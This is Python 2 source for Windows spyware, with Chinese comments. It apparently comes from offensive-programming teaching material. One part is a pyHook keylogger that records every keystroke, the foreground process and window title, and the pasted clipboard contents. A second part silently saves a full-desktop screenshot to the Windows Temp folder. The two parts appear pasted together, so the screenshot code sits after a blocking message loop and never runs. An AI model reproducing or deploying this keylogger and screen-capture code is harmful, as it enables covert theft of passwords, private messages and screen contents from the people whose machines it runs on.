# -*- coding: utf-8 -*-  
from ctypes import *
import pythoncom
import pyHook
import win32clipboard

user32 = windll.user32
kernel32 = windll.kernel32
psapi = windll.psapi
current_window = None

def get_current_process():
    # 获取最上层窗口句柄
    hwnd = user32.GetForegroundWindow()

    # 获取进程ID
    pid = c_ulong(0)
    user32.GetWindowThreadProcessId(hwnd, byref(pid))

    # 将进程ID存入变量中
    process_id = '%d' % pid.value

    # 申请内存
    executable = create_string_buffer('\x00'*512)
    h_process = kernel32.OpenProcess(0x400 | 0x10, False, pid)

    psapi.GetModuleBaseNameA(h_process, None, byref(executable), 512)

    # 读取窗口标题
    windows_title = create_string_buffer('\x00'*512)
    length = user32.GetWindowTextA(hwnd, byref(windows_title), 512)

    # 输出进程
    print
    print "[PID:%s-%s%s]" % (process_id, executable.value, windows_title.value)
    print

    # 关闭
    kernel32.CloseHandle(hwnd)
    kernel32.CloseHandle(h_process)

# 定义击键监听事件函数
def key_logger(event):
    # 检测目标窗口是否转移(换了其他窗口就监听新的窗口)
    global current_window
    if event.WindowName != current_window:
        current_window = event.WindowName
        get_current_process()

    # 检测击键是否常规按键（非组合键等）
    if 32 < event.Ascii <127:
        print chr(event.Ascii),
    else:
        # 若发现ctrl+v,则把clipboard记录下来
        if event.Key == 'V':
            win32clipboard.OpenClipboard()
            pasted_value = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            print '[PASTE]-%s' % pasted_value,
        else:
            print '[%s]' % event.Key,
    # 循环监听下一个击键事件
    return True

# 创建并注册hook管理器
kl = pyHook.HookManager()
kl.KeyDown = key_logger

# 注册hook并执行
kl.HookKeyboard()
pythoncom.PumpMessages()

import win32gui
import win32ui
import win32con
import win32api

def screen_shooter():
    hdesktop = win32gui.GetDesktopWindow()  # 获取桌面

    # 分辨率适应
    width = win32api.GetSystemMetrics(win32con.SM_CXVIRTUALSCREEN)
    height = win32api.GetSystemMetrics(win32con.SM_CYVIRTUALSCREEN)
    left = win32api.GetSystemMetrics(win32con.SM_XVIRTUALSCREEN)
    top = win32api.GetSystemMetrics(win32con.SM_YVIRTUALSCREEN)
     
    # 创建设备描述表
    desktop_dc = win32gui.GetWindowDC(hdesktop)
    img_dc = win32ui.CreateDCFromHandle(desktop_dc)
     
    # 创建一个内存设备描述表
    mem_dc = img_dc.CreateCompatibleDC()
     
    # 创建位图对象
    screenshot = win32ui.CreateBitmap()
    screenshot.CreateCompatibleBitmap(img_dc, width, height)
    mem_dc.SelectObject(screenshot)
     
    # 截图至内存设备描述表
    mem_dc.BitBlt((0, 0), (width, height), img_dc, (left, top), win32con.SRCCOPY)
     
    # 将截图保存到文件中
    screenshot.SaveBitmapFile(mem_dc, 'c:\\WINDOWS\\Temp\\screenshot.bmp')
     
    # 内存释放
    mem_dc.DeleteDC()
    win32gui.DeleteObject(screenshot.GetHandle())

screen_shooter()
